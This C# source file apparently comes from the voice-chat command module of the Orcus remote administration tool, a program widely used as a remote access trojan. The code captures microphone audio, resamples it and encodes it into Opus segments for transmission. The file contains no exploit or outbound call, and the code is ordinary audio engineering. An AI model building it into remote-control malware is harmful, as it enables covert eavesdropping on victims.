using System;
using CSCore;
using CSCore.CoreAudioAPI;
using CSCore.SoundIn;
using CSCore.Streams;
using OpusWrapper;
using OpusWrapper.Native;
using Orcus.Shared.Commands.VoiceChat;
using Orcus.Shared.Data;

namespace Orcus.Commands.VoiceChat.Utilities
{
    // ReSharper disable once InconsistentNaming
    public class CSCoreRecorder : IDisposable
    {
        private readonly MMDevice _captureDevice;
        private readonly bool _triggerSingleBlockRead;
        private IWaveSource _captureSource;
        private WasapiCapture _wasapiCapture;
        private readonly OpusEncoder _opusEncoder;
        private readonly int _bytesPerSegment;
        private const int SegmentFrames = 960;
        private byte[] _notEncodedBuffer;

        public CSCoreRecorder(MMDevice captureDevice, bool triggerSingleBlockRead, int bitrate, Application application)
        {
            _captureDevice = captureDevice;
            _triggerSingleBlockRead = triggerSingleBlockRead;
            _opusEncoder = OpusEncoder.Create(48000, 1, application);
            _opusEncoder.Bitrate = bitrate;
            _bytesPerSegment = _opusEncoder.FrameByteCount(SegmentFrames);
        }

        public void Dispose()
        {
            //Dont dispose capture device
            _wasapiCapture?.Stop();
            _captureSource?.Dispose();
            _wasapiCapture?.Dispose();
            _opusEncoder?.Dispose();
        }

        public event EventHandler<SingleBlockReadEventArgs> SingleBlockRead;
        public event EventHandler<DataInfoAvailableEventArgs> DataAvailable;

        public virtual void Initialize()
        {
            _wasapiCapture = new WasapiCapture
            {
                Device = _captureDevice
            };
            _wasapiCapture.Initialize();

            var soundInSource = new SoundInSource(_wasapiCapture);
            if (_triggerSingleBlockRead)
            {
                var notificationStream =
                    new SingleBlockNotificationStream(soundInSource.ChangeSampleRate(48000).ToMono().ToSampleSource());
                notificationStream.SingleBlockRead += NotificationStreamOnSingleBlockRead;
                _captureSource = notificationStream.ToWaveSource(16);
            }
            else
            {
                _captureSource = soundInSource
                    .ChangeSampleRate(48000)
                    .ToMono()
                    .ToSampleSource()
                    .ToWaveSource(16);
            }

            soundInSource.DataAvailable += SoundInSourceOnDataAvailable;
            _wasapiCapture.Start();
        }

        private void NotificationStreamOnSingleBlockRead(object sender, SingleBlockReadEventArgs singleBlockReadEventArgs)
        {
            SingleBlockRead?.Invoke(this, singleBlockReadEventArgs);
        }

        private void SoundInSourceOnDataAvailable(object sender,
            DataAvailableEventArgs dataAvailableEventArgs)
        {
            int read;
            var buffer = new byte[dataAvailableEventArgs.ByteCount];

            while ((read = _captureSource.Read(buffer, 0, buffer.Length)) > 0)
            {
                var notEncodedLength = _notEncodedBuffer?.Length ?? 0;
                var soundBuffer = new byte[read + notEncodedLength];

                //Fill the soundbuffer with _notEncodedBuffer
                if (notEncodedLength > 0)
                    Buffer.BlockCopy(_notEncodedBuffer, 0, soundBuffer, 0, notEncodedLength);

                //Fill the soundbuffer with the data
                Buffer.BlockCopy(buffer, 0, soundBuffer, notEncodedLength, read);

                var segmentCount = (int)Math.Floor((double)soundBuffer.Length / _bytesPerSegment);

                var segmentsEnd = segmentCount * _bytesPerSegment;
                var notEncodedCount = soundBuffer.Length - segmentsEnd;
                _notEncodedBuffer = new byte[notEncodedCount];

                Buffer.BlockCopy(soundBuffer, segmentsEnd, _notEncodedBuffer, 0, notEncodedCount);

                if (segmentCount == 0)
                    return;

                var dataBuffers = new byte[segmentCount][];
                var dataBufferLengths = new int[segmentCount];

                unsafe
                {
                    fixed (byte* soundBufferPtr = soundBuffer)
                        for (int i = 0; i < segmentCount; i++)
                        {
                            int len;
                            dataBuffers[i] = _opusEncoder.Encode(soundBufferPtr + _bytesPerSegment * i, _bytesPerSegment,
                                out len);
                            dataBufferLengths[i] = len;
                        }
                }

                DataAvailable?.Invoke(this,
                    new DataInfoAvailableEventArgs(new VoiceChatDataInfo(dataBuffers, dataBufferLengths)));
            }
        }
    }
}